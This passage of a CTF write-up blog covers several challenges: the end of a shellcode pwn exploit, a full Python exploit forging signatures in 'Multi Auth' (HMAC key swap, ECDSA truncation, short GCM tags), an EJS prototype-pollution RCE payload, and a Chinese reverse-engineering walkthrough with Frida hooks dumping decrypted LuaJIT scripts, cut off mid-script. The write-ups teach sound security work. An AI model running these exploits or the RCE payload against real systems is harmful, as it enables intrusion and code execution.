class="number">0</span>, a4=<span class="number">0</span>, a5=<span class="number">0</span>, a6=<span class="number">0</span>):</span><br><span class="line">    payload = f<span class="string">&quot;tictactoe:&#123;func_name&#125; &#123;a1&#125; &#123;a2&#125; &#123;a3&#125; &#123;a4&#125; &#123;a5&#125; &#123;a6&#125;&quot;</span></span><br><span class="line">    p.sendline(payload.encode())</span><br><span class="line"></span><br><span class="line">rpc_call(<span class="string">&quot;tmpfile&quot;</span>)</span><br><span class="line"></span><br><span class="line">rpc_call(<span class="string">&quot;splice&quot;</span>, a3=<span class="number">3</span>, a5=len(shellcode))</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">rpc_call(<span class="string">&quot;on_exit&quot;</span>, <span class="number">0x10000</span>)</span><br><span class="line">rpc_call(<span class="string">&quot;mmap&quot;</span>, <span class="number">0x10000</span>, <span class="number">4096</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Multi-Auth"><a href="#Multi-Auth" class="headerlink" title="Multi Auth"></a>Multi Auth</h2><blockquote><p>Description: Every crypto code may have bugs, so we have made a multi-authentication system diversifying across algorithms and languages.<br>Author: gros<br>Category: CRYPTO<br>Points: 373<br>Solves: 9</p></blockquote><p>The bugs in this question are all from the features of specific languages in the implementation of cryptographic algorithms or the wrong usage of them.</p><p>The top-level rust script is equivalent to a dispatcher, calling:</p><ul><li><strong>index.py</strong>: implements <code>auth</code> and <code>verify</code> based on <strong>hmac</strong></li><li><strong>index.go</strong>: implements <code>auth</code> and <code>verify</code> based on <strong>ecdsa</strong></li><li><strong>index.js</strong>: implements <code>auth</code> and <code>verify</code> based on <strong>aes-256-gcm</strong></li></ul><p>The bypass of hmac is simple. Pay attention to the implementation of the <code>auth</code> function in the python script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">key, msg</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hmac.new(msg, key, sha256).digest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">key, msg, sig</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hmac.compare_digest(sig, auth(key, msg))</span><br></pre></td></tr></table></figure><p>The positions of key and msg are reversed. According to <a href="https://en.wikipedia.org/wiki/HMAC">hmac definition</a>, we know that if the key is longer than the block size of the hash function, then the real key used to generate the hmac is the hash value of the key.</p><p><img src="/img/article/20230608/1.png"></p><p>So after sending the <code>sha256</code> value of the forbidden string through <code>auth</code>, we can get a signature that can pass the <code>verify</code>.</p><p>The input received by the ecdsa part is <code>forbidden || hmac</code> :</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> hmac_signature = hmac_auth.call(&amp;rpc).<span class="keyword">await</span>?;</span><br><span class="line">rpc.message.append(&amp;<span class="keyword">mut</span> hmac_signature.to_vec());</span><br><span class="line">signature.hmac = hmac_signature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ecdsa_signature = ecdsa_auth.call(&amp;rpc).<span class="keyword">await</span>?;</span><br></pre></td></tr></table></figure><p>When calling <code>ecdsa.SignASN1</code>, pass <code>msg</code> as the <code>hash</code> parameter:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SignASN1 signs a hash (which should be the result of hashing a larger message)</span></span><br><span class="line"><span class="comment">// using the private key, priv. If the hash is longer than the bit-length of the</span></span><br><span class="line"><span class="comment">// private key&#x27;s curve order, the hash will be truncated to that length. It</span></span><br><span class="line"><span class="comment">// returns the ASN.1 encoded signature.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SignASN1</span><span class="params">(rand io.Reader, priv *PrivateKey, hash []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span></span><br></pre></td></tr></table></figure><p>The comment also tells us that the hash will be converted to a number smaller than the curve order, and the <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.20.4:src/crypto/ecdsa/ecdsa.go;l=384">truncation method</a> is:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hashToNat</span>[<span class="title">Point</span> <span class="title">nistPoint</span>[<span class="title">Point</span>]]<span class="params">(c *nistCurve[Point], e *bigmod.Nat, hash []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> size := c.N.Size(); <span class="built_in">len</span>(hash) &gt; size &#123;</span><br><span class="line">hash = hash[:size]</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The order used here is 521, and our message is 520 bits. So theoretically adding the first byte of hmac can get a signature that passes <code>verify</code>.</p><p>As for the aes part, the 15 bytes returned by backdoor is <code>12 bytes of iv || 3 bytes of tag</code>. Nodejs checks whether the tag length is valid in <a href="https://github.com/nodejs/node/blob/1d1685e6fde1bcb47dd30c3bb45dba219939c272/src/crypto/crypto_cipher.cc#L49">this way</a>:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bool <span class="function"><span class="title">IsValidGCMTagLength</span>(<span class="params">unsigned int tag_len</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> tag_len == <span class="number">4</span> || tag_len == <span class="number">8</span> || (tag_len &gt;= <span class="number">12</span> &amp;&amp; tag_len &lt;= <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Therefore, the 4-byte tag can also work without any exception. Only the last byte needs to be tested.</p><p>The EXP is as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;multiauth.nc.jctf.pro&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">msg: <span class="built_in">bytes</span>, backdoor: <span class="built_in">bool</span> = <span class="literal">False</span></span>):</span></span><br><span class="line">    api = <span class="string">&quot;backdoor&quot;</span> <span class="keyword">if</span> backdoor <span class="keyword">else</span> <span class="string">&quot;auth&quot;</span></span><br><span class="line">    msg = base64.b64encode(msg).decode()</span><br><span class="line">    payload = json.dumps(&#123;<span class="string">&quot;method&quot;</span>: api, <span class="string">&quot;message&quot;</span>: msg&#125;)</span><br><span class="line">    p.sendline(payload.encode())</span><br><span class="line">    <span class="keyword">if</span> backdoor:</span><br><span class="line">        <span class="keyword">return</span> p.recv(<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json.loads(p.recvuntil(<span class="string">b&#x27;\\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">msg: <span class="built_in">bytes</span>, sigs: <span class="built_in">dict</span></span>):</span></span><br><span class="line">    msg = base64.b64encode(msg).decode()</span><br><span class="line">    payload = json.dumps(&#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;verify&quot;</span>, <span class="string">&quot;message&quot;</span>: msg, <span class="string">&quot;signatures&quot;</span>: sigs&#125;)</span><br><span class="line">    p.sendline(payload.encode())</span><br><span class="line">    response = p.recvuntil(<span class="string">b&#x27;\\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> response.decode()</span><br><span class="line"></span><br><span class="line">forbidden = <span class="string">b&quot;We the people, in order to get points, are kindly asking for flag&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;started\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">msg = hashlib.sha256(forbidden).digest()</span><br><span class="line">correct_hmac = auth(msg)[<span class="string">&quot;hmac&quot;</span>]</span><br><span class="line">log.info(correct_hmac)</span><br><span class="line"></span><br><span class="line">msg = forbidden + base64.b64decode(correct_hmac)</span><br><span class="line">correct_ecdsa = auth(msg)[<span class="string">&quot;ecdsa&quot;</span>]</span><br><span class="line">log.info(correct_ecdsa)</span><br><span class="line"></span><br><span class="line">sigs = &#123;</span><br><span class="line">    <span class="string">&quot;hmac&quot;</span>: correct_hmac,</span><br><span class="line">    <span class="string">&quot;ecdsa&quot;</span>: correct_ecdsa,</span><br><span class="line">    <span class="string">&quot;aes&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg = forbidden + base64.b64decode(correct_hmac) + base64.b64decode(correct_ecdsa)</span><br><span class="line">ivtag = auth(msg, backdoor=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    sigs[<span class="string">&quot;aes&quot;</span>] = base64.b64encode(ivtag + <span class="built_in">bytes</span>([i])).decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;CTF&quot;</span> <span class="keyword">in</span> verify(forbidden, sigs):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Perfect-Product"><a href="#Perfect-Product" class="headerlink" title="Perfect Product"></a>Perfect Product</h2><blockquote><p>Description: Check out my newest product gallery.<br>Category: WEB<br>Points: 340<br>Solves: 13</p></blockquote><p>The source code is quite simple：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> res.render(<span class="string">&#x27;index&#x27;</span>, &#123;products&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> params = req.body;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> params.name !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.description !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.price !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.tax !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.country !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">      <span class="keyword">typeof</span> params.image !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    res.send(<span class="string">&#x27;Bad request.&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  products.push(&#123;<span class="attr">name</span>: params.name, <span class="attr">description</span>: params.description, <span class="attr">price</span>: params.price, <span class="attr">tax</span>: params.tax, <span class="attr">country</span>: params.country, <span class="attr">image</span>: params.image&#125;);</span><br><span class="line">  <span class="keyword">return</span> res.render(<span class="string">&#x27;index&#x27;</span>, &#123;products&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">&#x27;/product&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> params = req.query || &#123;&#125;;</span><br><span class="line">  <span class="built_in">Object</span>.assign(params, req.body || &#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> name = params.name </span><br><span class="line">  <span class="keyword">let</span> strings = params.v;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!(strings <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &amp;&amp; !<span class="built_in">Array</span>.isArray(strings))&#123;</span><br><span class="line">    strings = [<span class="string">&#x27;NaN&#x27;</span>, <span class="string">&#x27;NaN&#x27;</span>, <span class="string">&#x27;NaN&#x27;</span>, <span class="string">&#x27;NaN&#x27;</span>, <span class="string">&#x27;NaN&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// make _0 to point to all strings, copy to prevent reference.</span></span><br><span class="line">  strings.unshift(<span class="built_in">Array</span>.from(strings));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data = &#123;&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> idx <span class="keyword">in</span> strings)&#123;</span><br><span class="line">    data[<span class="string">`_<span class="subst">$&#123;idx&#125;</span>`</span>] = strings[idx];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> name !== <span class="string">&#x27;string&#x27;</span>)&#123;</span><br><span class="line">    name = <span class="string">`Product: NaN`</span>; </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    name = <span class="string">`Product: <span class="subst">$&#123;name&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  data[<span class="string">&#x27;productname&#x27;</span>] = name;</span><br><span class="line"></span><br><span class="line">  data[<span class="string">&#x27;print&#x27;</span>] = !!params.print;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  res.render(<span class="string">&#x27;product&#x27;</span>, data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> testStr = <span class="string">`test4444`</span>;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> fetch(<span class="string">`http://localhost:<span class="subst">$&#123;port&#125;</span>/product?name=<span class="subst">$&#123;testStr&#125;</span>`</span>).then(<span class="function"><span class="params">e</span>=&gt;</span>e.text());</span><br><span class="line">  <span class="keyword">if</span>(res.includes(testStr))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`App listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Something went wrong while spawning the challenge&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>It uses the <a href="https://ejs.co/">ejs</a> rendering engine:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.enable(<span class="string">&#x27;view cache&#x27;</span>);</span><br></pre></td></tr></table></figure><p>And we can find some relevant posts:</p><ul><li><a href="https://github.com/CykuTW/My-CTF-Challenges/tree/master/AIS3-EOF-CTF-2019-Quals/echo">AIS3-EOF-CTF-2019-Quals/echo</a></li><li><a href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce">EJS - Server Side Prototype Pollution gadgets to RCE</a></li><li><a href="https://github.com/ljharb/qs/blob/main/test/parse.js">qs/parse.js</a></li></ul><p>So now we know:</p><ul><li>the prototype of <code>data</code> is controllable</li><li>set cache to a <code>null</code> string to disable view cache so that we can modify view options</li><li>we can modify the <code>escapeFunction</code> when <code>client</code> is set to a valid value</li></ul><p>The POC is as follows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/product?v[__proto__][]=exp&amp;v[__proto__][]=exp&amp;v[__proto__][]=exp&amp;v[__proto__][]=exp&amp;v[_proto__][cache]=&amp;v[_proto__][settings][view options][client]=1&amp;v[_proto__][settings][view options][escapeFunction]=process.mainModule.constructor._load(&quot;child_process&quot;).exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7th XCTF Final - Super Flagio</title>
      <link href="/2023/04/02/7th-XCTF-Final-Super-Flagio/"/>
      <url>/2023/04/02/7th-XCTF-Final-Super-Flagio/</url>
      
        <content type="html"><![CDATA[<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>本题基于 <a href="https://github.com/xiedantibu/MarioKing.git">MarioKing</a> 仓库构建了一个单机马里奥手游，以顶计数砖块的形式接收玩家输入：</p><p><img src="/img/article/20230402/get_input.jpg" alt="get_input"></p><p>以顶问号块的形式进行输入校验：</p><p><img src="/img/article/20230402/start_check.jpg" alt="start_check"></p><p>如果输入正确，玩家可以获得一个增强力量的蘑菇，从而击败守护 flag 的板栗仔。本题的 flag 即为玩家的正确输入（上下两行的拼接）。</p><h2 id="出题视角"><a href="#出题视角" class="headerlink" title="出题视角"></a>出题视角</h2><p>游戏采用 cocos2d-x 引擎与 lua 语言开发，其中大部分的加密和混淆方式均取材自我不久前研究的一款国产手游。因为这些逆向对抗手段都比较有意思，也较为经典，所以就拿过来出题了。</p><h3 id="环境检测"><a href="#环境检测" class="headerlink" title="环境检测"></a>环境检测</h3><p>相信这个部分大家都见怪不怪了，加不加影响不大，所以不如加上（</p><p>首先是 Java 层，在 <code>org.cocos2dx.lua.AppActivity</code> <em>onCreate</em> 函数中调用的 <em>Cocos2dxUtil.lowEngineVersion</em> 用于检测设备是否被 root。</p><p>其次是 Native 层，<em>JNI_OnLoad</em> 中通过 <em>pthread_create</em> 创建环境监测线程，检查进程是否被调试、是否存在 IDA server 和 frida server。</p><h3 id="lua-脚本加密"><a href="#lua-脚本加密" class="headerlink" title="lua 脚本加密"></a>lua 脚本加密</h3><p>采用 cocos2d-x 引擎 lua-binding 开发的游戏逻辑代码并不直接存在于 Java 层或 Native 层中，而是作为资源文件存放在 apk 的 <code>assets</code> 目录下，因此有必要对明文的 lua 脚本进行加密处理。</p><h4 id="脚本编译"><a href="#脚本编译" class="headerlink" title="脚本编译"></a>脚本编译</h4><p>本题使用的 cocos2d-x 引擎版本为 3.17.2，该版本的 lua 引擎为 LuaJIT。将 lua 脚本预编译为 LuaJIT 可解释的 luac 字节码文件以防止源码泄露，是一种对抗逆向工程的经典策略。</p><p>本题也采用了这种策略，但是为了防止 luac 能被现有工具直接反编译，我还修改了 LuaJIT 解释器的 opcode 顺序。</p><h4 id="内容加密"><a href="#内容加密" class="headerlink" title="内容加密"></a>内容加密</h4><p>传统的 cocos2d-x luac 加密是通过游戏引擎自带的 xxtea 算法完成的，因为密钥找起来太容易，所以这种方式自然被舍弃。</p><p>在实现时，我定义了一种以 <code>FF FF DB EE</code> 为文件头的加密文件结构，并修改 cocos2d-x 引擎源码的<em>FileUtilsAndroid::getContents</em>，加入了相应的解密函数。</p><h4 id="名称混淆"><a href="#名称混淆" class="headerlink" title="名称混淆"></a>名称混淆</h4><p>cocos2d-x 的游戏脚本一般存放在 apk 的 <code>assets/src</code> 目录下，为了防止有意义的符号泄露信息，我将该目录下的所有文件名、目录名修改为它们原本名字的 xxhash 结果，并修改 cocos2d-x 引擎源码的 <em>FileUtils::fullPathForFilename</em>，加入了相应的字符串映射函数。</p><h3 id="其他处理"><a href="#其他处理" class="headerlink" title="其他处理"></a>其他处理</h3><ul><li>输入校验逻辑虚拟化（小型虚拟机）</li><li>Native 层去符号</li></ul><h2 id="获取明文-luac64-文件"><a href="#获取明文-luac64-文件" class="headerlink" title="获取明文 luac64 文件"></a>获取明文 luac64 文件</h2><p>在 IDA 字符串窗口搜索 <code>cocos2d-x-</code> 可以发现程序使用的 cocos2d-x 版本为 <strong>3.17.2</strong>：</p><p><img src="/img/article/20230402/cocos2d_version.png" alt="cocos2d_version"></p><p>搜索 <code>LuaJIT</code> 可以发现程序使用的 LuaJIT 版本为 <strong>2.1.0-beta3</strong>：</p><p><img src="/img/article/20230402/luajit_version.png" alt="luajit_version"></p><p>从 <a href="https://github.com/LuaJIT/LuaJIT/tree/v2.1.0-beta3">LuaJIT-v2.1.0-beta3</a> 仓库下载源码，参考 <a href="http://luajit.org/install.html">LuaJIT 官方文档</a> 的 <strong>Cross-compiling LuaJIT</strong> 部分，使用 android-ndk-r20b 编译一份 arm64 架构的 libluajit.so，再借助 IDA bindiff 插件即可还原 LuaJIT 引擎的关键符号。</p><p>完成上述操作后，在函数列表中搜索可以发现 <em>luaL_loadbuffer</em> 的地址为 0xAC4E9C，该函数的原型为 <code>LUALIB_API int luaL_loadbuffer(lua_State *L, const char *buf, size_t size, const char *name)</code>，第二个参数指向当前加载字节码文件的二进制内容，第三个参数指明 buf 的大小，第四个参数为模块路径名。</p><p>hook 该函数入口，打印第四个参数 name：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lib_base = Module.findBaseAddress(<span class="string">&quot;libgame.so&quot;</span>);</span><br><span class="line"></span><br><span class="line">Interceptor.attach(lib_base.add(<span class="number">0xAC4E9C</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> chunk_name = args[<span class="number">3</span>].readCString();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Load: &quot;</span> + chunk_name);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>程序打开后（游戏主菜单处）注入上方 js 脚本，并点击开始游戏，frida 端的输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Load: scene/GameScene.pyc</span><br><span class="line">Load: core/GameMap.pyc</span><br><span class="line">Load: entity/Enemy.pyc</span><br><span class="line">Load: entity/Mario.pyc</span><br></pre></td></tr></table></figure><p>当<strong>顶问号方块</strong>时，还会输出 <code>Load: core/Util.pyc</code>，因此输入校验逻辑应该与其相关。这里可以看到，所有的脚本后缀都是 <code>.pyc</code>，但其实通过搜索文件头前四个字节，可以发现其为 LuaJIT 字节码文件。</p><p>先将所有加载了的脚本 dump 出来，在 dump 的过程中，手动将文件后缀改为 <code>.luac64</code>（指代 LuaJIT 64 位字节码）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> base_dir = <span class="string">&quot;/data/data/cn.org.xctf.flagio/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> lib_base = Module.findBaseAddress(<span class="string">&quot;libgame.so&quot;</span>);</span><br><span class="line"></span><br><span class="line">Interceptor.attach(lib_base.add(<span class="number">0xAC4E9C</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> chunk = args[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">var</span> chunk_size = args[<span class="number">2</span>].toInt32();</span><br><span class="line">        <span class="keyword">var</span> chunk_name = args[<span class="number">3</span>].readCString();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> new_name = chunk_name.slice(chunk_name.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>, -<span class="number">3</span>) + <span class="string">&quot;luac64&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="keyword">new</span> File(base_dir + new_name, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">        file.write(chunk.readByteArray(chunk_size));</span><br><span class="line">        file.close();</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>将文件移动到 /data/local/tmp 并赋予 777 权限后拉到本地即可获得明文的 luac64 文件：</p><p><img src="/img/article/20230402/dump_bytecodes.png" alt="dump_bytecodes"></p><p>为什么说这些文件是 64 位而不是 32 位的呢？我们用 16 进制编辑器随便打开一个文件，它的前五个字节都是 <code>1B 4C 4A 02 0A</code>。而第五个字节的 0x0A 是 LuaJIT 文件结构中的 <code>GlobalHeader.flags</code> 字段，其二进制形式为 <code>1010</code>， 置位的两个比特位分别表示<strong>文件被去掉了符号</strong>（FLAG_IS_STRIPPED = 0b00000010）和<strong>采用</strong> <code>2-slot frame info</code> <strong>模式</strong>（FLAG_FR2 = 0b00001000），后者是 64 位引入的新特性，详情请参考 <a href="https://github.com/LuaJIT/LuaJIT/issues/25">Finish LJ_GC64 mode</a>。</p><p>当然，你可以通过打印  <em>luaL_loadbuffer</em> 的调用栈往上追溯到关键解密函数 <em>sub_5035CC</em>，分析它的实现再写脚本解密 apk 的 <code>assets/src</code> 目录下的所有加密文件（或用其他方法主动调用）。不过这样做就复杂了，所以这里不作展开，仅给出 python 版的解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 